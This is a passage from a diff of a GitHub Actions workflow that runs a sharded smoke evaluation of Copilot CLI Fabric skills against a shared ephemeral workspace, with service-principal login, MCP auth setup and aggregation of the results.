+          fi
+          # NOTE: Do NOT call `::add-mask::$ws_id` here. GitHub Actions
+          # silently strips masked values from job outputs at job-completion
+          # time ("Skip output 'workspace-id' since it may contain secret"
+          # warning), so a mask here would break the cross-job propagation
+          # that this PR's shard + summarise jobs depend on for {{WORKSPACE_ID}}
+          # substitution in Layer 2 program graders. The workspace is an
+          # ephemeral per-run test artefact (provisioned in this job, deleted
+          # in summarise's cleanup step), and the shard step has to log the
+          # GUID anyway to invoke run-vally-eval.ps1 -- so the mask provided
+          # essentially zero security benefit while breaking the output flow.
+          {
+            echo "workspace-id=$ws_id"
+            echo "workspace-name=$ws_name"
+          } >> "$GITHUB_OUTPUT"
+          echo "Provisioned shared workspace: $ws_name (id: $ws_id)"
+
+  # -----------------------------------------------------------------
+  # shard: 5-way matrix. Each shard authenticates and runs its
+  # deterministic slice of the smoke suite against the SHARED workspace
+  # provisioned by setup (consumed via needs.setup.outputs.workspace-*).
+  # Workspace cleanup happens in the summarise job, not per-shard, so a
+  # shard cleanup race cannot delete the workspace while a peer is still
+  # writing to it.
+  # -----------------------------------------------------------------
+  shard:
+    needs: [setup, detect]
+    # detect is SKIPPED on schedule + workflow_dispatch, so guard with
+    # !cancelled() (an implicit success() check would otherwise skip shard
+    # whenever detect is skipped). On PR: require detect success AND a non-zero
+    # match count. Off PR (schedule/dispatch): the event_name clause short-
+    # circuits true so the full suite runs regardless of detect's skipped state.
+    if: >-
+      !cancelled() && needs.setup.outputs.ready == 'true' &&
+      (github.event_name != 'pull_request' ||
+       (needs.detect.result == 'success' && needs.detect.outputs.matched-count != '0'))
+    runs-on: windows-latest
+    timeout-minutes: 70
+    permissions:
+      id-token: write
+      contents: read
+    strategy:
+      fail-fast: false
+      matrix:
+        # Sharding is by-eval-DIR (round-robin over sorted eval.yaml paths)
+        # inside the wrapper at tests/run-vally-eval.ps1 (-ShardIndex/-ShardCount).
+        # Not by-stim. Distribution is deterministic but not strictly balanced --
+        # shard 2 historically gets dataflows-authoring-cli (the heaviest eval,
+        # ~30 min worst case). Use --workers 3 within each shard for stim-level
+        # parallelism.
+        #
+        # Shard count is dynamic per PR scope: detect emits shard-json
+        # right-sized per matched-eval-dirs with a deliberate cliff at >=4
+        # (matched=1->1 shard, 2->2, 3->3, 4->5, 5+->5; cliff preserves full
+        # parallelism for 4+ to avoid eval-stacking on a single shard near
+        # the 70-min step timeout). A PR touching 1 skill spawns 1 shard
+        # (1 workspace) instead of 5 shards (5 workspaces, 4 idle).
+        # Schedule + workflow_dispatch skip detect and fall back to the
+        # full 5-shard set via the `||` default.
+        shard: ${{ fromJson(needs.detect.outputs.shard-json || '[0,1,2,3,4]') }}
+    env:
+      # SHARD_COUNT must equal the matrix length. Derive from strategy.job-total,
+      # which IS the matrix length at runtime. This is more robust than reading
+      # detect.outputs.shard-count separately (which could drift from shard-json
+      # if a future edit updates one without the other). The runtime assertion
+      # below this env block fails fast on mismatch.
+      SHARD_COUNT: ${{ strategy.job-total }}
+      VALLY_SHARD_INDEX: ${{ matrix.shard }}
+    steps:
+      - uses: actions/checkout@df4cb1c069e1874edd31b4311f1884172cec0e10 # v6.0.3
+
+      - name: Verify SHARD_COUNT matches matrix length
+        shell: bash
+        # Defense-in-depth: strategy.job-total is the matrix size at runtime.
+        # If the matrix shape ever drifts (e.g. someone adds shard 5 without
+        # updating the SHARD_COUNT env), the wrapper's `-ShardCount` arg
+        # would silently under- or over-count. Fail loud here instead.
+        run: |
+          set -euo pipefail
+          if [ -z "${SHARD_COUNT:-}" ]; then
+            echo "::error::SHARD_COUNT env var is empty; matrix size unavailable"
+            exit 1
+          fi
+          # strategy.job-total IS the matrix length for a single-axis matrix.
+          # Sanity-check it parses as a positive integer.
+          if ! [[ "$SHARD_COUNT" =~ ^[1-9][0-9]*$ ]]; then
+            echo "::error::SHARD_COUNT='$SHARD_COUNT' is not a positive integer"
+            exit 1
+          fi
+          echo "SHARD_COUNT=$SHARD_COUNT (matrix length)"
+
+      # NOTE: vally-fabric-auth is intentionally NOT invoked here at the top
+      # of the shard. PR #272 retrospective: auth is deferred until AFTER the
+      # third-party installs (pip, npm, choco) and the local plugin build, so
+      # a transient install failure cannot waste a Key Vault round-trip / Phase
+      # A cert materialisation, and the SP cert / az session live the minimum
+      # time on the runner before the first auth-consuming step.
+
+      - name: Setup Python (for run-vally-eval.ps1)
+        uses: actions/setup-python@a309ff8b426b58ec0e2a45f0f869d46889d02405 # v6.2.0
+        with:
+          python-version: '3.11'
+
+      - name: Install shard Python dependencies
+        shell: bash
+        run: |
+          set -euo pipefail
+          # shellcheck source=.github/scripts/retry.sh
+          source "${GITHUB_WORKSPACE}/.github/scripts/retry.sh"
+          retry python -m pip install --upgrade pip
+          # pyyaml: required by run-vally-eval.ps1 to resolve a suite's filter.tags
+          # from .vally.yaml when running in suite mode. setup_test_env.py (the
+          # other Python entrypoint) runs in the setup job now, so pyarrow is
+          # installed there, not here.
+          # Package index/network blips are the common failure mode here, so
+          # retry only the dependency install and keep the step fail-loud.
+          retry pip install pyyaml
+
+      - name: Setup Node 22 (required by vally-cli + copilot-sdk)
+        uses: actions/setup-node@49933ea5288caeca8642d1e84afbd3f7d6820020 # v4.4.0
+        with:
+          node-version: '22'
+
+      - name: Install Copilot CLI
+        shell: bash
+        run: |
+          set -euo pipefail
+          # shellcheck source=.github/scripts/retry.sh
+          source "${GITHUB_WORKSPACE}/.github/scripts/retry.sh"
+          # npm registry ECONNRESETs have already hit this harness; retry the
+          # global install before failing the shard.
+          retry npm install -g @github/copilot@1.0.50
+          copilot --version
+
+      - name: Install sqlcmd (for sqldw-consumption stimuli)
+        shell: bash
+        run: |
+          set -euo pipefail
+          # shellcheck source=.github/scripts/retry.sh
+          source "${GITHUB_WORKSPACE}/.github/scripts/retry.sh"
+          # Chocolatey pulls package metadata over the network, so retry
+          # transient transport failures before declaring the shard broken.
+          retry choco install sqlcmd -y --no-progress
+          which sqlcmd
+
+      - name: Build plugin (materialize skills)
+        shell: bash
+        run: python build/build_plugins.py
+
+      # -----------------------------------------------------------------
+      # -----------------------------------------------------------------
+      # Auth is deferred to here -- after the third-party installs (pip,
+      # npm, choco) and the local plugin build. None of those steps use
+      # SP credentials or Azure context, so a transient install failure
+      # cannot waste a Key Vault round-trip / Phase A cert materialisation,
+      # and the SP cert / az session live the minimum time on the runner
+      # before the first auth-consuming step. The shared workspace itself
+      # is provisioned in the setup job (consumed via
+      # needs.setup.outputs.workspace-*); the SP login here only grants
+      # this shard the identity that the agent's eval-time Fabric API
+      # calls will inherit.
+      # -----------------------------------------------------------------
+      - name: Authenticate to Fabric tenant
+        uses: ./.github/actions/vally-fabric-auth
+        with:
+          mode: ${{ needs.setup.outputs.mode }}
+          sp-app-id: ${{ secrets.SP_APP_ID }}
+          sp-cert-base64: ${{ secrets.SP_CERT_BASE64 }}
+          sp-object-id: ${{ secrets.SP_OBJECT_ID }}
+          tenant-domain: ${{ secrets.TENANT_DOMAIN }}
+          azure-client-id: ${{ secrets.AZURE_CLIENT_ID }}
+          azure-tenant-id: ${{ secrets.AZURE_TENANT_ID }}
+          azure-subscription-id: ${{ secrets.AZURE_SUBSCRIPTION_ID }}
+          kv-name: ${{ vars.FABRIC_SMOKE_KV_NAME }}
+
+      # -----------------------------------------------------------------
+      # Log this shard in as the Fabric service principal so subsequent
+      # Fabric API calls inside the eval (via the agent's skills) inherit
+      # the SP identity. Workspace provisioning itself happens once in the
+      # setup job and is consumed via needs.setup.outputs.workspace-*; the
+      # shared workspace was already granted Contributor to this SP by
+      # setup_test_env.py --sp-object-id.
+      # -----------------------------------------------------------------
+      - name: Login to Azure as Fabric service principal
+        shell: pwsh
+        run: |
+          $tenantDomain = ($env:TENANT_DOMAIN ?? "").Trim()
+          $spAppId      = ($env:SP_APP_ID ?? "").Trim()
+          $spCertPath   = ($env:SP_CERT_PATH ?? "").Trim()
+          if (-not $tenantDomain) { Write-Error "TENANT_DOMAIN env var is empty after trim"; exit 1 }
+          if (-not $spAppId)      { Write-Error "SP_APP_ID env var is empty after trim";      exit 1 }
+          if (-not $spCertPath)   { Write-Error "SP_CERT_PATH env var is empty after trim";   exit 1 }
+          if (-not (Test-Path $spCertPath)) { Write-Error "SP cert PEM does not exist at $spCertPath"; exit 1 }
+          # A transient AAD/network failure should not burn the whole shard;
+          # retry auth with bounded exponential backoff.
+          $max = 3
+          $delay = 5
+          for ($attempt = 1; $attempt -le $max; $attempt++) {
+              az login --service-principal --tenant $tenantDomain --username $spAppId --certificate $spCertPath --allow-no-subscriptions | Out-Null
+              $exitCode = if ($null -ne $global:LASTEXITCODE) { [int]$global:LASTEXITCODE } else { 0 }
+              if ($exitCode -eq 0) { break }
+              if ($attempt -ge $max) {
+                  Write-Error "az login --service-principal failed after $max attempts (LASTEXITCODE=$exitCode)"
+                  exit $exitCode
+              }
+              Write-Warning "az login --service-principal failed (attempt $attempt/$max, LASTEXITCODE=$exitCode); retrying in ${delay}s"
+              Start-Sleep -Seconds $delay
+              $delay *= 2
+          }
+          Write-Host "az login succeeded as service principal: $spAppId"
+
+      # ========== MCP auth (powerbi-modeling-mcp) ==========
+      # Mirror of fabric-smoke-ephemeral.yml (PR #314): translate the existing
+      # SP cert state (SP_APP_ID + TENANT_DOMAIN|TENANT_ID + SP_CERT_PATH) into
+      # the AZURE_* env vars that @microsoft/powerbi-modeling-mcp consumes when
+      # spawned under --authmode=serviceprincipal. NONE of these are secrets:
+      # SP_APP_ID is the client/app id, AZURE_TENANT_ID is the directory id,
+      # and the cert path is a runner-temp file. The cert itself lives on disk
+      # only. CI_MCP_OVERLAY=true gates Add-CiPowerBiMcpAuthToStagedEval inside
+      # tests/run-vally-eval.ps1, which (and only which) rewrites the staged
+      # eval.yaml to add --authmode=serviceprincipal --skipconfirmation plus the
+      # AZURE_* env block to the powerbi-modeling-mcp server declaration that
+      # Vally then passes to the Copilot CLI via its native MCP loader. Local
+      # dev runs leave CI_MCP_OVERLAY unset and the committed (interactive)
+      # MCP block is staged unchanged.
+      - name: Export MCP-auth env for service-principal cert auth
+        shell: bash
+        run: |
+          set -euo pipefail
+          # AZURE_TENANT_ID must be the directory GUID. Phase B may have
+          # exported TENANT_ID from KV. Phase A only has TENANT_DOMAIN (the
+          # .onmicrosoft.com form); resolve to GUID via the SP login that just
+          # succeeded above (az account is already authenticated).
+          if [ -n "${TENANT_ID:-}" ]; then
+            AZURE_TENANT_ID_VAL="$TENANT_ID"
+          else
+            AZURE_TENANT_ID_VAL=$(az account show --query tenantId -o tsv)
+          fi
+          {
+            echo "AZURE_CLIENT_ID=$SP_APP_ID"
+            echo "AZURE_TENANT_ID=$AZURE_TENANT_ID_VAL"
+            echo "AZURE_CLIENT_CERTIFICATE_PATH=$SP_CERT_PATH"
+            echo "CI_MCP_OVERLAY=true"
+          } >> "$GITHUB_ENV"
+          echo "MCP auth env ready (CI_MCP_OVERLAY=true): client_id=$SP_APP_ID tenant=$AZURE_TENANT_ID_VAL cert=$SP_CERT_PATH"
+
+      # -----------------------------------------------------------------
+      # Run this shard's slice of vally eval --suite smoke via the wrapper.
+      # The wrapper owns {{WORKSPACE}} substitution + staging + sharding; we
+      # pass the SHARED workspace name from setup outputs, shard coordinates,
+      # and worker count through.
+      # -----------------------------------------------------------------
+      - name: Run vally smoke shard
+        shell: pwsh
+        env:
+          WORKSPACE_NAME: ${{ needs.setup.outputs.workspace-name }}
+          # Layer 2 program graders need the resolved workspace GUID for
+          # {{WORKSPACE_ID}} substitution; pull it from setup outputs (the
+          # shared workspace provision). Without this the wrapper's
+          # Get-WorkspaceIdForSubstitution helper would fall back to
+          # live Fabric discovery on every shard. The env var name matches
+          # the wrapper's contract (Assert-WorkspaceGuid scans
+          # FABRIC_WORKSPACE_ID by name).
+          FABRIC_WORKSPACE_ID: ${{ needs.setup.outputs.workspace-id }}
+          # COPILOT_GITHUB_TOKEN is the only token name vally + copilot-sdk
+          # actually read. The earlier `GH_TOKEN: ${{ secrets.COPILOT_GITHUB_TOKEN }}`
+          # binding was a stray -- no consumer in this step (vally, copilot,
+          # the wrapper, build_plugins) reads GH_TOKEN, and leaving it bound
+          # put the PAT under a generic name that any future `gh ...` shell-out
+          # would pick up implicitly. Removed.
+          COPILOT_GITHUB_TOKEN: ${{ secrets.COPILOT_GITHUB_TOKEN }}
+          # MCP overlay env (set above via $GITHUB_ENV). Explicit re-binding
+          # here documents the contract that run-vally-eval.ps1's per-eval
+          # Add-CiPowerBiMcpAuthToStagedEval rewrite depends on, even though
+          # $GITHUB_ENV already propagates these to subsequent steps.
+          CI_MCP_OVERLAY: ${{ env.CI_MCP_OVERLAY }}
+          AZURE_CLIENT_ID: ${{ env.AZURE_CLIENT_ID }}
+          AZURE_TENANT_ID: ${{ env.AZURE_TENANT_ID }}
+          AZURE_CLIENT_CERTIFICATE_PATH: ${{ env.AZURE_CLIENT_CERTIFICATE_PATH }}
+          VALLY_SUITE: ${{ inputs.suite || 'smoke' }}
+          VALLY_RUNS: ${{ inputs.runs || '1' }}
+          VALLY_WORKERS: ${{ inputs.workers || '3' }}
+          VALLY_SHARD_COUNT: ${{ env.SHARD_COUNT }}
+          VALLY_RESULTS_DIR: ${{ runner.temp }}/vally-results
+          # PR-scope eval-dir filter from the detect job. Empty on schedule +
+          # workflow_dispatch (detect skipped) -> wrapper runs the full suite,
+          # UNLESS the dispatch caller provided an eval-dirs input for ad-hoc
+          # per-skill testing (overrides the detect output).
+          # "ALL" (infra-touched PR) is also treated as full-suite by the wrapper.
+          VALLY_EVAL_DIRS: ${{ inputs.eval-dirs != '' && inputs.eval-dirs || needs.detect.outputs.eval-dirs }}
+          VALLY_BASELINE: ${{ inputs.baseline-mode || 'false' }}
+        run: |
+          New-Item -ItemType Directory -Force -Path $env:VALLY_RESULTS_DIR | Out-Null
+          $ws = ($env:WORKSPACE_NAME ?? "").Trim()
+          if (-not $ws) { Write-Error "WORKSPACE_NAME env var is empty"; exit 1 }
+          $wsId = ($env:FABRIC_WORKSPACE_ID ?? "").Trim()
+          if (-not $wsId) { Write-Error "FABRIC_WORKSPACE_ID env var is empty (Layer 2 program graders need it for {{WORKSPACE_ID}} substitution)"; exit 1 }
+          $runs = if ([string]::IsNullOrWhiteSpace($env:VALLY_RUNS)) { 1 } else { [int]$env:VALLY_RUNS }
+          if ($runs -lt 1) { Write-Error "runs must be >= 1 (got '$env:VALLY_RUNS')"; exit 1 }
+          $workers = if ([string]::IsNullOrWhiteSpace($env:VALLY_WORKERS)) { 3 } else { [int]$env:VALLY_WORKERS }
+          if ($workers -lt 1) { Write-Error "workers must be >= 1 (got '$env:VALLY_WORKERS')"; exit 1 }
+          $suite = if ([string]::IsNullOrWhiteSpace($env:VALLY_SUITE)) { 'smoke' } else { $env:VALLY_SUITE }
+          $shardIndex = [int]$env:VALLY_SHARD_INDEX
+          $shardCount = [int]$env:VALLY_SHARD_COUNT
+          # Use hashtable splat for switch params -- a 1-element array splat
+          # like @('-Baseline') is treated as a POSITIONAL string by PowerShell,
+          # which binds to the next free positional param ($Skill) and breaks.
+          $baselineSplat = @{}
+          if ($env:VALLY_BASELINE -eq 'true') {
+              $baselineSplat = @{ Baseline = $true }
+              Write-Host "::warning::Baseline mode enabled -- agent runs WITHOUT Fabric skills. Many graders will legitimately fail; this run is informational comparison data only."
+          }
+          # PR-scope filter: pass -EvalDirs only when detect resolved a concrete
+          # CSV. Empty string (schedule/dispatch) or "ALL" (infra PR) means the
+          # full suite, so omit the arg and let the wrapper discover everything.
+          $evalDirsSplat = @{}
+          if (-not [string]::IsNullOrWhiteSpace($env:VALLY_EVAL_DIRS) -and $env:VALLY_EVAL_DIRS -ne 'ALL') {
+              $evalDirsSplat = @{ EvalDirs = $env:VALLY_EVAL_DIRS }
+          }
+          # --max-retries 0 disables vally's per-stim retry loop. Default 2
+          # amplifies session.idle timeouts on flaky stims (e.g. dataflow
+          # refresh poll that hits 10-min idle) to 3x the trial wall-time.
+          # The non-flaky 37 stims complete first attempt anyway, so retries
+          # are wasted budget. Pinning to 0 saves ~20 min per timeout.
+          $invokeSummary = "-Workspace $ws -WorkspaceId $wsId -Suite $suite -Runs $runs -Workers $workers -MaxRetries 0 -ShardIndex $shardIndex -ShardCount $shardCount"
+          if ($evalDirsSplat.ContainsKey('EvalDirs')) { $invokeSummary += " -EvalDirs $($evalDirsSplat.EvalDirs)" }
+          if ($baselineSplat.ContainsKey('Baseline')) { $invokeSummary += " -Baseline" }
+          # Layer 2 program graders need the resolved workspace GUID via the
+          # wrapper's -ResultsDir flag plumbing; appended below. The actual
+          # fail-fast empty-check happened earlier at the top of this step
+          # (around the WORKSPACE_NAME validation), so a missing env was
+          # already surfaced as a clear error before we got here.
+          $invokeSummary += " -ResultsDir $env:VALLY_RESULTS_DIR/vally-output"
+          Write-Host "Invoking run-vally-eval.ps1 $invokeSummary"
+          ./tests/run-vally-eval.ps1 -Workspace $ws -WorkspaceId $wsId -Suite $suite -Runs $runs -Workers $workers `
+              -MaxRetries 0 -ShardIndex $shardIndex -ShardCount $shardCount `
+              -ResultsDir "$env:VALLY_RESULTS_DIR/vally-output" `
+              @evalDirsSplat @baselineSplat `
+              *>&1 | Tee-Object -FilePath "$env:VALLY_RESULTS_DIR/vally-run.log"
+          $vallyExit = $LASTEXITCODE
+          # Vally now writes the timestamped output dir directly into
+          # $VALLY_RESULTS_DIR/vally-output via --output-dir. No post-exit
+          # copy needed -- the runner.temp path is persistent across the
+          # vally exit handler's cleanup attempts and the artifact upload
+          # picks it up regardless of whether EBUSY fired.
+          $outputCount = @(Get-ChildItem -Path "$env:VALLY_RESULTS_DIR/vally-output" -Recurse -File -ErrorAction SilentlyContinue).Count
+          Write-Host "Vally wrote $outputCount file(s) to $env:VALLY_RESULTS_DIR/vally-output for artifact upload."
+          if ($vallyExit -ne 0) {
+              # Classify exit via tests/vally-ci/Classify-VallyExit.ps1 -- the
+              # heuristic (EBUSY rescue + sub-grader-budget-trip swallow + true
+              # propagation + bracket-optional regex for vally 0.5.0
+              # non-deterministic output) is unit-tested under
+              # tests/vally-ci/Classify-VallyExit.tests.ps1.
+              . ./tests/vally-ci/Classify-VallyExit.ps1
+              $logText = Get-Content "$env:VALLY_RESULTS_DIR/vally-run.log" -Raw -ErrorAction SilentlyContinue
+              $verdict = Get-VallyExitVerdict -LogText $logText -ExitCode $vallyExit
+              foreach ($m in $verdict.Messages) { Write-Host $m }
+              $vallyExit = $verdict.Exit
+          }
+          exit $vallyExit
+
+      - name: Render per-trial human-readable transcripts
+        if: always()
+        shell: pwsh
+        env:
+          VALLY_RESULTS_DIR: ${{ runner.temp }}/vally-results
+        run: |
+          # Walk the shard's results.jsonl and emit one .txt transcript per
+          # trial under $VALLY_RESULTS_DIR/transcripts/. Mirrors the legacy
+          # smoke harness's per-test _output.txt format so reviewers can grep
+          # a failing trial without writing a parser. Always runs so a failed
+          # vally exit still produces transcripts for triage.
+          pwsh -NoLogo -NoProfile -File ${{ github.workspace }}/tests/vally-ci/Render-VallyTranscripts.ps1 `
+            -ResultsRoot "$env:VALLY_RESULTS_DIR"
+
+      - name: Upload shard results
+        if: always()
+        uses: actions/upload-artifact@043fb46d1a93c77aae656e7c1c64a875d1fc6a0a # v7.0.1
+        with:
+          name: vally-smoke-results-${{ github.run_id }}-${{ github.run_attempt }}-shard${{ matrix.shard }}${{ inputs.baseline-mode == 'true' && '-baseline' || '' }}
+          path: |
+            ${{ runner.temp }}/vally-results/**
+          if-no-files-found: warn
+          retention-days: 30
+
+  # -----------------------------------------------------------------
+  # summarise: aggregate the per-shard result artifacts into a single
+  # job summary, and clean up the SHARED ephemeral workspace once every
+  # shard has finished. Always runs (so a failed shard still produces a
+  # table) but fails when zero trial results were produced, so a harness
+  # crash cannot render as a green 0/0 outcome.
+  #
+  # The cleanup step runs `if: always()` AFTER summarisation so a failed
+  # shard or a parse failure cannot leak the workspace. The daily cron in
+  # fabric-cleanup-stale-workspaces.yml remains the backstop for cancelled
+  # runs (cancel-in-progress kills this job before cleanup) and runner
+  # crashes.
+  #
+  # Skip when shard itself skipped (DRAFT PR -> detect skipped -> shard
+  # skipped -> summarise would otherwise download 0 artifacts and exit 1).
+  # The 'shard.result != skipped' guard makes this a clean "all skipped"
+  # outcome instead of a false-fail when the PR is intentionally draft.
+  # 'shard.result != cancelled' covers user-initiated workflow cancellation:
+  # a cancelled shard either uploads no artifacts (under-reporting the
+  # cross-shard total) or all shards cancelled and the L-1060 hard-fail
+  # fires turning a deliberate cancel into a red run indistinguishable
+  # from a real harness death.
+  # -----------------------------------------------------------------
+  summarise:
+    needs: [setup, detect, shard]
+    if: |
+      always()
+      && needs.setup.outputs.ready == 'true'
+      && needs.shard.result != 'skipped'
+      && needs.shard.result != 'cancelled'
+    runs-on: windows-latest
+    # Summarise checks out the repo (needed to dot-source tests/vally-ci/*.ps1
+    # after the extraction in commit 43cfb2a), downloads shard artifacts, then
+    # Summarise calls vally-fabric-auth at the top of the job so the cleanup
+    # step at the bottom can delete the shared ephemeral workspace via az
+    # rest. Phase B of the auth composite uses azure/login@v2 OIDC, which
+    # needs id-token: write at the job level. Phase A is cert-based but the
+    # composite invokes either path conditionally, so the permission has to
+    # be granted unconditionally for cleanup to work under either mode.
+    permissions:
+      contents: read
+      id-token: write
+      # actions: read so Get-VallyDeepLinks can call the runs/jobs +
+      # runs/artifacts REST endpoints with the workflow-scoped GH_TOKEN
+      # (passed on the summarise step env below).
+      actions: read
+    outputs:
+      total-count: ${{ steps.summarise.outputs.total-count || '0' }}
+      pass-count: ${{ steps.summarise.outputs.pass-count || '0' }}
+      fail-count: ${{ steps.summarise.outputs.fail-count || '0' }}
+      gating-stim-total: ${{ steps.summarise.outputs.gating-stim-total || '0' }}
+      gating-stim-failed: ${{ steps.summarise.outputs.gating-stim-failed || '0' }}
+      gate-mode: ${{ steps.summarise.outputs.gate-mode || 'comment-only' }}
+      # Base64-encoded JSON failure set ([{skill,stim,rootCause}]) consumed by
+      # the post-comment job. Base64 avoids GITHUB_OUTPUT multi-line/quoting
+      # hazards and keeps the value on a single line.
+      failure-set-b64: ${{ steps.summarise.outputs.failure-set-b64 || '' }}
+    steps:
+      # Checkout + auth composite are needed by the cleanup step at the end
+      # of this job (cleanup references repo paths and the Fabric tenant)
+      # AND by the inline summarise step (dot-sources tests/vally-ci/*.ps1).
+      # They run early so the shared workspace can be deleted even if the
+      # download or summarise steps themselves error out.
+      - uses: actions/checkout@df4cb1c069e1874edd31b4311f1884172cec0e10 # v6.0.3
+
+      - name: Authenticate to Fabric tenant
+        if: needs.setup.outputs.workspace-id != ''
+        uses: ./.github/actions/vally-fabric-auth
+        with:
+          mode: ${{ needs.setup.outputs.mode }}
+          sp-app-id: ${{ secrets.SP_APP_ID }}
+          sp-cert-base64: ${{ secrets.SP_CERT_BASE64 }}
+          sp-object-id: ${{ secrets.SP_OBJECT_ID }}
+          tenant-domain: ${{ secrets.TENANT_DOMAIN }}
+          azure-client-id: ${{ secrets.AZURE_CLIENT_ID }}
+          azure-tenant-id: ${{ secrets.AZURE_TENANT_ID }}
+          azure-subscription-id: ${{ secrets.AZURE_SUBSCRIPTION_ID }}
+          kv-name: ${{ vars.FABRIC_SMOKE_KV_NAME }}
+
+      - name: Download all shard results
+        uses: actions/download-artifact@3e5f45b2cfb9172054b4087a40e8e0b5a5461e7c # v8.0.1
+        with:
+          path: ${{ runner.temp }}/all-shards
+          pattern: vally-smoke-results-${{ github.run_id }}-${{ github.run_attempt }}-shard*
+
+      - name: Summarise vally results
+        id: summarise
+        shell: pwsh
+        env:
+          # GH_TOKEN scoped to this workflow run; consumed by Get-VallyDeepLinks
+          # (gh api calls to /runs/{id}/jobs + /runs/{id}/artifacts).
+          GH_TOKEN: ${{ github.token }}
+          # Eval-dir scope from detect, OR workflow_dispatch input override.
+          # Empty on schedule + unfiltered dispatch (full suite).
+          VALLY_MATCHED_EVAL_DIRS: ${{ inputs.eval-dirs != '' && inputs.eval-dirs || needs.detect.outputs.eval-dirs }}
+          VALLY_BASELINE: ${{ inputs.baseline-mode || 'false' }}
+          # fail-on-regression posture (PR #272 thread: exit-0 masks
+          # regression). Defaults to 'false' during the calibration window
+          # (workload teams own L1+L2 uplift) so a below-threshold eval
+          # surfaces as a ::warning:: but does NOT fail the workflow. Flip to
+          # 'true' from workflow_dispatch (or hard-code once calibration is
+          # complete) to make per-eval thresholds the gate.
+          VALLY_FAIL_ON_REGRESSION: ${{ inputs.fail-on-regression || 'false' }}
+          # Gate A (merge gate) posture. Default 'false' during the calibration
+          # window so a stim with any grader fail surfaces as the PR sticky
+          # comment (post-comment job) + a ::warning::, but does NOT red-fail
+          # the workflow. This breaks the cutover catch-22: the PR's own run is
+          # red on the new gate, and there was no toggle to suppress Gate A the
+          # way Gate B (VALLY_FAIL_ON_REGRESSION) already could. Flip to 'true'
+          # once stims are driven green and Vally is the hard primary gate.
+          VALLY_GATE_ON_STIM_FAIL: ${{ inputs.gate-on-stim-fail || 'false' }}
+        run: |
+          # Parsing + rendering is extracted into tests/vally-ci/*.ps1 and
+          # unit-tested under tests/vally-ci/*.tests.ps1. The fail-on-regression
+          # decision + per-eval ::warning:: annotations stay inline because they
+          # are workflow-specific glue (GITHUB_OUTPUT writes, $env contract).
+          . ./tests/vally-ci/Classify-VallyFailure.ps1
+          . ./tests/vally-ci/Aggregate-VallyResults.ps1
+          . ./tests/vally-ci/Format-VallyJobSummary.ps1
+          . ./tests/vally-ci/Get-VallyDeepLinks.ps1
+          . ./tests/vally-ci/Export-VallySchemaArtifact.ps1
+
+          $resultsRoot = "$env:RUNNER_TEMP/all-shards"
+          $agg = Get-VallyAggregate -ResultsRoot $resultsRoot
+
+          if ($agg.UsedFallback) {
+              Write-Host "::warning::results.jsonl missing across $($agg.ShardLogCount) shard log(s); parsed $($agg.Total) score(s) from vally-run.log fallback (vally 0.5.0 Windows EBUSY cleanup race)."
+          } elseif ($agg.ShardLogCount -gt 0 -and $agg.ShardsWithJsonl -gt 0 -and $agg.ShardsWithJsonl -lt $agg.ShardLogCount) {
+              # Mixed-EBUSY divergence: some shards finalised results.jsonl,
+              # others did not. The global fallback above stays dormant
+              # (because Total > 0 from the surviving shards), so the EBUSY
+              # shards' eval-level failures parseable only from vally-run.log
+              # are NOT in $agg.Failed / $agg.PerEval. Surface as a warning
+              # so operators investigate; gate semantics are unchanged for
+              # this round. Per-shard fallback restructure tracked as a
+              # follow-up.
+              $missing = $agg.ShardLogCount - $agg.ShardsWithJsonl
+              Write-Host "::warning::Mixed-EBUSY detected: $($agg.ShardsWithJsonl) of $($agg.ShardLogCount) shard(s) produced results.jsonl; $missing shard(s) lost JSONL but their vally-run.log was uploaded. Eval-level failures from the JSONL-less shard(s) are NOT included in the merge gate this round; review the per-shard vally-run.log under the artifact for parseable score/crash lines."
+          }
+
+          Write-Host "--------------------------------------------------------------------"
+          Write-Host "  Vally smoke summary:"
+          Write-Host "    Trials (per results.jsonl entry): $($agg.Passed) of $($agg.Total) passed, $($agg.Failed) failed"
+          Write-Host "    Stims (binary all-graders-pass):  $($agg.StimPass) of $($agg.StimTotal) passed, $($agg.StimFail) failed"
+          Write-Host "    Stims with any grader failed:    $($agg.GatingStimTotal - $agg.GatingStimFailed) of $($agg.GatingStimTotal) passed, $($agg.GatingStimFailed) failed (merge gate)"
+          Write-Host "===================================================================="
+          "total-count=$($agg.Total)" | Out-File -FilePath $env:GITHUB_OUTPUT -Append
+          "pass-count=$($agg.Passed)" | Out-File -FilePath $env:GITHUB_OUTPUT -Append
+          "fail-count=$($agg.Failed)" | Out-File -FilePath $env:GITHUB_OUTPUT -Append
+          "stim-total=$($agg.StimTotal)" | Out-File -FilePath $env:GITHUB_OUTPUT -Append
+          "stim-pass=$($agg.StimPass)" | Out-File -FilePath $env:GITHUB_OUTPUT -Append
+          "stim-fail=$($agg.StimFail)" | Out-File -FilePath $env:GITHUB_OUTPUT -Append
+          "gating-stim-total=$($agg.GatingStimTotal)" | Out-File -FilePath $env:GITHUB_OUTPUT -Append
+          "gating-stim-failed=$($agg.GatingStimFailed)" | Out-File -FilePath $env:GITHUB_OUTPUT -Append
+
+          # Emit the gate mode + the per-stim failure set (deduped to distinct
+          # (Skill, Stimulus) pairs, each tagged with the first-encountered
+          # RootCause class for that pair -- deterministic via the
+          # Aggregate-VallyResults append order, NOT a most-frequent/mode) for
+          # the post-comment job. Base64 of compact JSON keeps the value
+          # single-line and quoting-safe across the GITHUB_OUTPUT contract.
+          $gateMode = if ($env:VALLY_GATE_ON_STIM_FAIL -eq 'true') { 'gating' } else { 'comment-only' }
+          "gate-mode=$gateMode" | Out-File -FilePath $env:GITHUB_OUTPUT -Append
+          # FailureRows is built internally by Get-VallyAggregate with Skill,
+          # Stimulus AND RootCause set on every row (see Aggregate-VallyResults.ps1),
+          # so the direct $row.Skill / $row.Stimulus access is safe (the fields
+          # are always present -- this step also does not enable Set-StrictMode).
+          # RootCause is read via the indexed-property guard purely defensively
+          # in case the failure taxonomy is ever extended to omit it.
+          $failureSet = @{}
+          foreach ($row in $agg.FailureRows) {
+              $key = "$($row.Skill)::$($row.Stimulus)"
+              if (-not $failureSet.ContainsKey($key)) {
+                  $rc = if ($row.PSObject.Properties['RootCause'] -and $row.RootCause) { [string]$row.RootCause } else { 'Other' }
+                  $failureSet[$key] = [pscustomobject]@{ skill = [string]$row.Skill; stim = [string]$row.Stimulus; rootCause = $rc }
+              }
+          }
+          $failureArr = @($failureSet.Values)
+          $failureJson = $failureArr | ConvertTo-Json -Compress -Depth 4
+          if ([string]::IsNullOrWhiteSpace($failureJson)) { $failureJson = '[]' }
+          # ConvertTo-Json emits a bare object (not a 1-element array) for a
